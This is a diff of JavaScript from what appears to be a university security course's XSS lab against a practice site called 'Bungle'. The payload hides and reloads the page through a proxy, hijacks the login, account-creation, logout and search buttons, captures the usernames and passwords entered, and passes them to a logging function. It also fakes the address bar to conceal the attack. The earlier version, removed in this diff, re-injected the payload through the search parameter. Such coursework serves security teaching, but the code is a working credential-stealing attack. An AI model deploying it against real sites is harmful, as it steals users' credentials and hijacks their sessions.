@@ -13,77 +13,156 @@
 			
 			function logInListener(event) {
 				event.preventDefault();
+				
 				var message = new Object();
 				message.event = "login";
-				if (document.getElementById("log-in-btn")) {
-					var user = document.getElementById("username").value;
-					message.user = user;
-				}
-				if (document.getElementById("log-in-btn")) {
-					var pass = document.getElementById("userpass").value;
-					message.pass = pass;
-				}
+				var user = document.getElementById("username").value;
+				message.user = user;
+				var pass = document.getElementById("userpass").value;
+				message.pass = pass;
 				log(message);
-				window.removeEventListener("submit", logInListener);
+				
 				$.ajax({
 					type: "POST",
 					data: {"username": user, "password": pass},
-					url: "http://bungle-cs461.csl.illinois.edu/login?xssdefense=0" 
+					url: "http://bungle-cs461.csl.illinois.edu/login?xssdefense=0"
 				}).done(function (data) {
-					var url ="http://bungle-cs461.csl.illinois.edu/search?xssdefense=0" +
-						"&q=" + encodeURIComponent("<script" + ">" + payload.toString() + 
-						";payload(\"" + attacker + "\");</script" + ">");
-					$.ajax({
-						type: "GET",
-						url: url
-						}).done(function (data) {
-						proxy("./");
-					});
+					proxy("./");
+					window.history.pushState(null, "Bungle!",
+						"http://bungle-cs461.csl.illinois.edu/");
+				});
+			}
+			
+			function createListener(event) {
+				event.preventDefault();
+				
+				var message = new Object();
+				message.event = "create";
+				var user = document.getElementById("username").value;
+				message.user = user;
+				var pass = document.getElementById("userpass").value;
+				message.pass = pass;
+				log(message);
+				
+				$.ajax({
+					type: "POST",
+					data: {"username": user, "password": pass},
+					url: "http://bungle-cs461.csl.illinois.edu/create?xssdefense=0"
+				}).done(function (data) {
+					proxy("./");
+					window.history.pushState(null, "Bungle!",
+						"http://bungle-cs461.csl.illinois.edu/");
 				});
 			}
 			
 			function logOutListener(event) {
 				event.preventDefault();
+				
 				var message = new Object();
 				message.event = "logout";
 				message.user = document.getElementById("logged-in-user").innerHTML;
 				log(message);
-				window.removeEventListener("submit", logOutListener);
+				
 				$.ajax({
 					type: "POST",
-					url: "http://bungle-cs461.csl.illinois.edu/logout?xssdefense=0" 
+					url: "http://bungle-cs461.csl.illinois.edu/logout?xssdefense=0"
 				}).done(function (data) {
-					var url ="http://bungle-cs461.csl.illinois.edu/search?xssdefense=0" +
-						"&q=" + encodeURIComponent("<script" + ">" + payload.toString() + 
-						";payload(\"" + attacker + "\");</script" + ">");
-					$.ajax({
-						type: "GET",
-						url: url
-					}).done(function (data) {
-						proxy("./");
-					});
+					proxy("./");
+					window.history.pushState(null, "Bungle!",
+						"http://bungle-cs461.csl.illinois.edu/");
 				});
+			}
+			
+			function searchListener(event) {
+				event.preventDefault();
+				
+				var message = new Object();
+				message.event = "search";
+				if (document.getElementById("logged-in-user"))
+					message.user = document.getElementById("logged-in-user").innerHTML;
+				var query = document.getElementById("query").value;
+				message.query = query;
+				log(message);
+				
+				var url = "./search?xssdefense=0&q=";
+				url = url.concat(query);
+				proxy(url);
+				window.history.pushState(null, "Bungle!",
+						"http://bungle-cs461.csl.illinois.edu/".concat(url));
+			}
+			
+			function searchAgListener(event) {
+				event.preventDefault();
+				
+				var message = new Object();
+				message.event = "search again";
+				if (document.getElementById("logged-in-user"))
+					message.user = document.getElementById("logged-in-user").innerHTML;
+				log(message);
+				
+				proxy("./");
+				window.history.pushState(null, "Bungle!",
+						"http://bungle-cs461.csl.illinois.edu/");
+			}
+			
+			function bungleListener(event) {
+				event.preventDefault();
+				
+				var message = new Object();
+				message.event = "bungle";
+				if (document.getElementById("logged-in-user"))
+					message.user = document.getElementById("logged-in-user").innerHTML;
+				log(message);
+				
+				proxy("./");
+				window.history.pushState(null, "Bungle!",
+						"http://bungle-cs461.csl.illinois.edu/");
 			}
 			
 			function proxy(href) {
 				$("html").load(href, function(res) {
 					$("html").show();
-					log({"event": "nav", "url": href});
+					if (document.getElementById("logged-in-user")) {
+						var user = document.getElementById("logged-in-user").innerHTML;
+						log({"event": "nav", "user": user, "url": href});
+					} else {
+						log({"event": "nav", "url": href});
+					}
 					$("#query").val("pwned!");
-					// Login listener
+					// Listeners
 					if (document.getElementById("log-in-btn")) {
-						window.addEventListener("submit", logInListener);
+						document.getElementById("log-in-btn").onclick = logInListener;
+					}
+					
+					if (document.getElementById("new-account-btn")) {
+						document.getElementById("new-account-btn").onclick = createListener;
 					}
 					
 					if (document.getElementById("log-out-btn")) {
-						window.addEventListener("submit", logOutListener);
+						document.getElementById("log-out-btn").onclick = logOutListener;
 					}
-					window.history.replaceState(null, 'Bungle!',
-						'http://bungle-cs461.csl.illinois.edu/');
+					
+					if (document.getElementById("search-btn")) {
+						document.getElementById("search-btn").onclick = searchListener;
+					}
+					
+					if (document.getElementById("search-again-btn")) {
+						document.getElementById("search-again-btn").onclick = searchAgListener;
+					}
+					
+					if (document.getElementById("bungle-lnk")) {
+						document.getElementById("bungle-lnk").onclick = bungleListener;
+					}
+					
+					window.addEventListener("popstate", function(event) {
+						proxy(window.location.href);
+					});
 				});
 			}
 			$("html").hide();
 			proxy("./");
+			window.history.replaceState(null, "Bungle!",
+						"http://bungle-cs461.csl.illinois.edu/");
 		}
 		
 		function makeLink(xssdefense, target, attacker) {
